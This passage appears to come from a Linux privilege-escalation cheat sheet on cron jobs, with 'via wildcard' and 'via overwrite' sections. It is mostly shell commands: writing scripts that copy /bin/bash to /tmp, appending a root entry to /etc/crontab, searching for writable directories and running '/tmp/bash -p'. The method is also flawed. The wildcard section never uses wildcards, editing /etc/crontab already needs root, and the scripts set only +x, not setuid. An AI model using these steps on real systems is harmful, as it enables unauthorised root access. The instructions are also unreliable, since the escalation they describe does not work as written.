	- `/tmp/bash -p `

###### via wildcard

Wildcard exploitation involves leveraging the behavior of the shell when expanding wildcard characters (`*`, `?`, etc.) in filenames. While `crontab` itself does not directly involve wildcard expansion, it may execute scripts or commands that contain wildcard characters.

1. **Viewing `crontab` Entries**: Use the `cat` command to view the contents of the user's `crontab` file:
	- `cat /etc/crontab`
2. **Crafting a Malicious Script**: Create a malicious script with a filename containing wildcard characters:
	- `echo '#!/bin/bash' > /tmp/evil_script.sh`
	- `echo 'cp /bin/bash /tmp/bash; chmod +x /tmp/bash' >> /tmp/evil_script.sh`
3. **Injecting the Script**: Modify the user's `crontab` file to execute the malicious script:
	- `echo '* * * * * root /tmp/evil_script.sh' >> /etc/crontab`

Once the script executes, the `/bin/bash` binary will be copied to `/tmp/bash`

###### via overwrite - the most common thing in machine

Overwrite exploitation involves exploiting vulnerabilities in file handling to overwrite critical system files or configuration files with malicious content. This can lead to privilege escalation if the overwritten files are executed with elevated privileges.

1. **Identify Writeable Locations**: Use the `find` command to identify locations where the user has write permissions:
	-  `find / -writable -type d 2>/dev/null`
2. **Identify Potential Targets**: Look for critical system files or configuration files that are read or executed by the system.
3. **Craft a Malicious File**: Create a malicious file with content that will be executed with elevated privileges:
	- `echo '#!/bin/bash' > /tmp/malicious_script.sh`
	- `echo 'cp /bin/bash /tmp/bash; chmod +x /tmp/bash' >> /tmp/malicious_script.sh`
4. **Overwrite the Target**: Use techniques such as symlink attacks or symbolic link attacks to overwrite the target file with the malicious content.

Once the overwritten file executes, the `/bin/bash` binary will be copied to `/tmp/bash`
